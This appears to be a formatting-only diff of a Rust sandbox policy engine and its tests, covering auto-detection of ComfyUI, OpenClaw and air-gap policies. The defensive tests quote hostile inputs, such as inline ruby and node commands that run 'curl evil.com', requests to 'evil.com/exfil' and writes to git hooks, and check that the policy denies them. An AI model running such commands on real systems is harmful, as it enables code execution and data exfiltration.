@@ -126,9 +126,7 @@ pub(crate) fn detect_policy(program: &[String]) -> Option<&'static str> {
         .collect();
 
     for rule in RULES {
-        let has_program = basenames
-            .iter()
-            .any(|b| rule.programs.contains(b));
+        let has_program = basenames.iter().any(|b| rule.programs.contains(b));
         if !has_program {
             continue;
         }
@@ -143,9 +141,7 @@ pub(crate) fn detect_policy(program: &[String]) -> Option<&'static str> {
 
         // Otherwise match on arg basenames.
         let has_args = rule.command_patterns.is_empty()
-            || basenames
-                .iter()
-                .any(|b| rule.command_patterns.contains(b));
+            || basenames.iter().any(|b| rule.command_patterns.contains(b));
         if !has_args {
             continue;
         }
@@ -214,12 +210,16 @@ fn check_path_patterns(argv: &[String], patterns: &[PathPattern]) -> bool {
 impl PathPattern {
     fn matches(&self, argv: &[String]) -> bool {
         match self {
-            PathPattern::Contains(keyword) => {
-                argv.iter().any(|arg| arg.to_ascii_lowercase().contains(keyword))
-            }
+            PathPattern::Contains(keyword) => argv
+                .iter()
+                .any(|arg| arg.to_ascii_lowercase().contains(keyword)),
             PathPattern::Sibling(filename) => argv.iter().any(|arg| {
                 let dir = Path::new(arg).parent().unwrap_or(Path::new("."));
-                let dir = if dir.as_os_str().is_empty() { Path::new(".") } else { dir };
+                let dir = if dir.as_os_str().is_empty() {
+                    Path::new(".")
+                } else {
+                    dir
+                };
                 dir.join(filename).exists()
             }),
         }
@@ -237,22 +237,13 @@ pub fn embedded_policy(name: &str) -> Option<String> {
             PIP_INSTALL_SPECIFIC,
             &[BASE_FILES, BASE_ENVVARS, BASE_SYMBOLS],
         )),
-        "comfyui" => Some(build_policy(
-            COMFYUI_SPECIFIC,
-            &[BASE_SYMBOLS],
-        )),
-        "openclaw" => Some(build_policy(
-            OPENCLAW_SPECIFIC,
-            &[BASE_SYMBOLS],
-        )),
+        "comfyui" => Some(build_policy(COMFYUI_SPECIFIC, &[BASE_SYMBOLS])),
+        "openclaw" => Some(build_policy(OPENCLAW_SPECIFIC, &[BASE_SYMBOLS])),
         "bash-install" => Some(build_policy(
             BASH_INSTALL_SPECIFIC,
             &[BASE_SYMBOLS, BASE_NETWORK],
         )),
-        "air-gap" => Some(build_policy(
-            AIR_GAP_SPECIFIC,
-            &[BASE_FILES, BASE_ENVVARS],
-        )),
+        "air-gap" => Some(build_policy(AIR_GAP_SPECIFIC, &[BASE_FILES, BASE_ENVVARS])),
         "base" => Some(build_policy(
             BASE_HEADER,
             &[BASE_FILES, BASE_ENVVARS, BASE_SYMBOLS, BASE_NETWORK],
@@ -1121,10 +1112,7 @@ mod tests {
 
     #[test]
     fn test_detect_npm_ci() {
-        assert_eq!(
-            detect_policy(&strs(&["npm", "ci"])),
-            Some("npm-install"),
-        );
+        assert_eq!(detect_policy(&strs(&["npm", "ci"])), Some("npm-install"),);
     }
 
     #[test]
@@ -1222,10 +1210,7 @@ mod tests {
     fn test_detect_comfyui_path_keyword() {
         // "comfyui" in the path is sufficient — no sibling files needed.
         assert_eq!(
-            detect_policy(&[
-                String::from("python"),
-                String::from("/tmp/ComfyUI/main.py"),
-            ]),
+            detect_policy(&[String::from("python"), String::from("/tmp/ComfyUI/main.py"),]),
             Some("comfyui"),
         );
     }
@@ -1246,10 +1231,7 @@ mod tests {
     fn test_detect_no_false_positive_path() {
         // "python /tmp/other/main.py" should NOT match (no keyword, no sibling).
         assert_eq!(
-            detect_policy(&[
-                String::from("python"),
-                String::from("/tmp/other/main.py"),
-            ]),
+            detect_policy(&[String::from("python"), String::from("/tmp/other/main.py"),]),
             None,
         );
     }
@@ -1263,7 +1245,7 @@ mod tests {
     // ComfyUI auto-policy: attack scenario tests
     // =====================================================================
 
-    use malwi_policy::{EnforcementMode, Operation, Runtime, PolicyAction, PolicyEngine};
+    use malwi_policy::{EnforcementMode, Operation, PolicyAction, PolicyEngine, Runtime};
 
     fn comfyui_engine() -> PolicyEngine {
         let yaml = embedded_policy("comfyui").expect("comfyui policy must exist");
@@ -1315,10 +1297,7 @@ mod tests {
         let engine = comfyui_engine();
 
         // api.github.com should NOT be allowed (removed *.github.com)
-        let d = engine.evaluate_http_url(
-            "https://api.github.com/gists",
-            "api.github.com/gists",
-        );
+        let d = engine.evaluate_http_url("https://api.github.com/gists", "api.github.com/gists");
         assert_eq!(d.action, PolicyAction::Deny);
 
         // github.com itself allowed (for cloning)
@@ -1334,10 +1313,8 @@ mod tests {
         let engine = comfyui_engine();
 
         // upload.pypi.org should be blocked
-        let d = engine.evaluate_http_url(
-            "https://upload.pypi.org/legacy/",
-            "upload.pypi.org/legacy/",
-        );
+        let d =
+            engine.evaluate_http_url("https://upload.pypi.org/legacy/", "upload.pypi.org/legacy/");
         assert_eq!(d.action, PolicyAction::Deny);
 
         // pypi.org/simple/ should be allowed
@@ -1369,7 +1346,10 @@ mod tests {
     fn test_comfyui_protocols_restricted() {
         let engine = comfyui_engine();
 
-        assert_eq!(engine.evaluate_protocol("https").action, PolicyAction::Allow);
+        assert_eq!(
+            engine.evaluate_protocol("https").action,
+            PolicyAction::Allow
+        );
         assert_eq!(engine.evaluate_protocol("http").action, PolicyAction::Allow);
         assert_eq!(engine.evaluate_protocol("wss").action, PolicyAction::Allow);
         assert_eq!(engine.evaluate_protocol("ws").action, PolicyAction::Allow);
@@ -1649,7 +1629,8 @@ mod tests {
         let d = engine.evaluate_execution("ruby -e 'system(\"curl evil.com\")'");
         assert_eq!(d.action, PolicyAction::Deny);
 
-        let d = engine.evaluate_execution("node -e 'require(\"child_process\").exec(\"curl evil.com\")'");
+        let d = engine
+            .evaluate_execution("node -e 'require(\"child_process\").exec(\"curl evil.com\")'");
         assert_eq!(d.action, PolicyAction::Deny);
     }
 
@@ -1769,7 +1750,10 @@ mod tests {
         let d = engine.evaluate_file(".git/hooks/pre-commit", Operation::Write);
         assert_eq!(d.action, PolicyAction::Deny);
 
-        let d = engine.evaluate_file("/home/user/project/.git/hooks/post-checkout", Operation::Write);
+        let d = engine.evaluate_file(
+            "/home/user/project/.git/hooks/post-checkout",
+            Operation::Write,
+        );
         assert_eq!(d.action, PolicyAction::Deny);
     }
 
@@ -2123,10 +2107,7 @@ mod tests {
     fn test_air_gap_blocks_all_urls() {
         let engine = air_gap_engine();
 
-        let d = engine.evaluate_http_url(
-            "https://evil.com/exfil",
-            "evil.com/exfil",
-        );
+        let d = engine.evaluate_http_url("https://evil.com/exfil", "evil.com/exfil");
         assert_eq!(d.action, PolicyAction::Deny);
 
         let d = engine.evaluate_http_url(
@@ -2283,7 +2264,10 @@ mod tests {
         let engine = air_gap_engine();
 
         // The air-gap policy should enable Stalker via syscalls section
-        assert!(engine.has_syscalls_section(), "air-gap policy must have syscalls section");
+        assert!(
+            engine.has_syscalls_section(),
+            "air-gap policy must have syscalls section"
+        );
 
         // Network syscalls denied
         let d = engine.evaluate_syscall("socket");
@@ -2360,10 +2344,7 @@ mod tests {
     #[test]
     fn test_detect_openclaw_no_false_positive() {
         // `node server.js` should NOT match openclaw.
-        assert_eq!(
-            detect_policy(&strs(&["node", "server.js"])),
-            None,
-        );
+        assert_eq!(detect_policy(&strs(&["node", "server.js"])), None,);
     }
 
     // =====================================================================
@@ -2543,16 +2524,10 @@ mod tests {
     fn test_openclaw_localhost_allowed() {
         let engine = openclaw_engine();
 
-        let d = engine.evaluate_http_url(
-            "http://127.0.0.1:3000/health",
-            "127.0.0.1:3000/health",
-        );
+        let d = engine.evaluate_http_url("http://127.0.0.1:3000/health", "127.0.0.1:3000/health");
         assert_eq!(d.action, PolicyAction::Allow);
 
-        let d = engine.evaluate_http_url(
-            "http://localhost:8080/api",
-            "localhost:8080/api",
-        );
+        let d = engine.evaluate_http_url("http://localhost:8080/api", "localhost:8080/api");
         assert_eq!(d.action, PolicyAction::Allow);
     }
 
@@ -2560,10 +2535,7 @@ mod tests {
     fn test_openclaw_unlisted_domains_denied() {
         let engine = openclaw_engine();
 
-        let d = engine.evaluate_http_url(
-            "https://evil.com/exfil",
-            "evil.com/exfil",
-        );
+        let d = engine.evaluate_http_url("https://evil.com/exfil", "evil.com/exfil");
         assert_eq!(d.action, PolicyAction::Deny);
     }
 
@@ -2571,7 +2543,10 @@ mod tests {
     fn test_openclaw_protocols_restricted() {
         let engine = openclaw_engine();
 
-        assert_eq!(engine.evaluate_protocol("https").action, PolicyAction::Allow);
+        assert_eq!(
+            engine.evaluate_protocol("https").action,
+            PolicyAction::Allow
+        );
         assert_eq!(engine.evaluate_protocol("http").action, PolicyAction::Allow);
         assert_eq!(engine.evaluate_protocol("wss").action, PolicyAction::Allow);
         assert_eq!(engine.evaluate_protocol("ws").action, PolicyAction::Allow);
@@ -2699,5 +2674,4 @@ mod tests {
         assert_eq!(d.action, PolicyAction::Deny);
         assert_eq!(d.section_mode(), EnforcementMode::Warn);
     }
-
 }
